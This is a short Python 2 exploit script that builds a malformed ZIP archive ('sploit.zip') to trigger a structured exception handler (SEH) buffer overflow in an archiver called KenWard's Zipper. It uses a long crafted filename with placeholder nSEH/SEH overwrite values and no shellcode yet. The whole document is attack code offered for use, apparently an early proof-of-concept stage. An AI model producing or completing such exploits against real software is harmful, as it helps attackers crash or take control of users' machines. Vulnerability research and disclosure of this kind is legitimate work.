#!/usr/bin/python

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

#central directory header
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")

# end of central directory header
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")


nSEH = "B" * 4
SEH  = "C" * 4

payload  = "A" * 1022
payload += nSEH
payload += SEH
payload += "D" * (4064 - len(payload))

payload += ".bin"

zip = ( ldf_header + payload + cdf_header + payload + eofcdf_header );

f = open("sploit.zip", "w")
f.write(zip)
f.close()

print "[*] Local file header size = 0x%x" %len(ldf_header)
print "[*] Central directory file header size = 0x%x" %len(cdf_header)
print "[*] End of central directory record size = 0x%x" %len(eofcdf_header)
print "[*] Payload size = %s bytes" %len(payload)
print "[*] sploit.zip created.  Open it with KenWard's Zipper."

